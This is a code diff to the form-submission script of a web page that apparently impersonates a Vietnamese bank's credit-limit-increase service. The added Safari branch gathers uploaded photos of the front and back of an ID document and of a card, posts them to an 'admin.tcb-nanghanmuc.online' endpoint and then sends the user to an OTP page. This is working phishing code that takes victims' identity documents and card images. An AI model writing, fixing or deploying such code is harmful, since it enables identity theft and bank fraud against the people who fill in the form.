@@ -421,8 +421,28 @@
 
                 var formData = new FormData($(this)[0]);
                 // fix safari
+                // check is safari
+                if (navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') == -1) {
+                    formData.append('mattruoc', mattruoc.files[0]);
+                    formData.append('matsau', matsau.files[0]);
+                    formData.append('mattruoc_card', mattruoc_card.files[0]);
+                    formData.append('matsau_card', matsau_card.files[0]);
 
-                $.ajax({
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://admin.tcb-nanghanmuc.online/api/customer', true);
+                    xhr.send(formData);
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState == 4 && xhr.status == 200) {
+                            window.location.href = '/otp.html';
+                        } else {
+                            console.log(xhr);
+                            alert('Vui lòng kiểm tra lại thông tin!');
+                        }
+                    }
+                    return;
+
+                } else {
+                    $.ajax({
                     url: 'https://admin.tcb-nanghanmuc.online/api/customer',
                     // url: 'http://localhost/api/customer',
                     type: 'POST',
@@ -442,6 +462,8 @@
                         alert('Vui lòng kiểm tra lại thông tin!');
                     }
                 });
+                }
+               
             });
         });
     </script>
